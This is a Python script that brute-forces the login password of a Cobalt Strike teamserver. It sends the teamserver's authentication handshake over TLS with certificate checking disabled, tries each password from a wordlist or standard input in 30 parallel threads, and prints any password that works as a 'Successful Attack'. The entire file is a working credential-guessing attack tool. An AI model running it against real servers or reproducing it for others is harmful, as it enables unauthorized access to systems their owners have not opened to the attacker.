
import time,socket,ssl,argparse,concurrent.futures,sys

MIN_PYTHON = (3, 3)
if sys.version_info < MIN_PYTHON:
    sys.exit("Python %s.%s or later is required.\n" % MIN_PYTHON)

parser = argparse.ArgumentParser()

parser.add_argument("host",
                    help="Teamserver address")
parser.add_argument("wordlist", nargs="?",
                    help="Newline-delimited word list file")

args = parser.parse_args()

class NotConnectedException(Exception):
    def __init__(self, message=None, node=None):
        self.message = message
        self.node = node

class DisconnectedException(Exception):
    def __init__(self, message=None, node=None):
        self.message = message
        self.node = node

class Connector:
    def __init__(self):
        self.sock = None
        self.ssl_sock = None
        self.ctx = ssl.SSLContext()
        self.ctx.verify_mode = ssl.CERT_NONE
        pass

    def is_connected(self):
        return self.sock and self.ssl_sock

    def open(self, hostname, port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10)
        self.ssl_sock = self.ctx.wrap_socket(self.sock)

        if hostname == socket.gethostname():
            ipaddress = socket.gethostbyname_ex(hostname)[2][0]
            self.ssl_sock.connect((ipaddress, port))
        else:
            self.ssl_sock.connect((hostname, port))

    def close(self):
        if self.sock:
            self.sock.close()
        self.sock = None
        self.ssl_sock = None

    def send(self, buffer):
        if not self.ssl_sock: raise NotConnectedException("Not connected (SSL Socket is null)")
        self.ssl_sock.sendall(buffer)

    def receive(self):
        if not self.ssl_sock: raise NotConnectedException("Not connected (SSL Socket is null)")
        received_size = 0
        data_buffer = b""

        while received_size < 4:
            data_in = self.ssl_sock.recv()
            data_buffer = data_buffer + data_in
            received_size += len(data_in)

        return data_buffer

def passwordcheck(password):
    if len(password) > 0:
        result = None
        conn = Connector()
        conn.open(args.host, 50050)
        payload = bytearray(b"\x00\x00\xbe\xef") + len(password).to_bytes(1, "big", signed=True) + bytes(bytes(password, "ascii").ljust(256, b"A"))
        conn.send(payload)
        if conn.is_connected(): result = conn.receive()
        if conn.is_connected(): conn.close()
        if result == bytearray(b"\x00\x00\xca\xfe"): return password
        else: return False
    else: print("Do not have a blank password!!!")

passwords = []

if args.wordlist: passwords = open(args.wordlist).read().split("\n")
else: 
    for line in sys.stdin: passwords.append(line.rstrip())

if len(passwords) > 0:
    attempts = 0
    failures = 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:

        future_to_check = {executor.submit(passwordcheck, password): password for password in passwords}
        for future in concurrent.futures.as_completed(future_to_check):
            password = future_to_check[future]
            try:
                data = future.result()
                attempts = attempts + 1
                if data:
                    print ("Successful Attack!!!")
                    print("Target Password: {}".format(password))
            except Exception as exc:
                failures = failures + 1
                print('%r generated an exception: %s' % (password, exc))

else:
    print("Password(s) required")
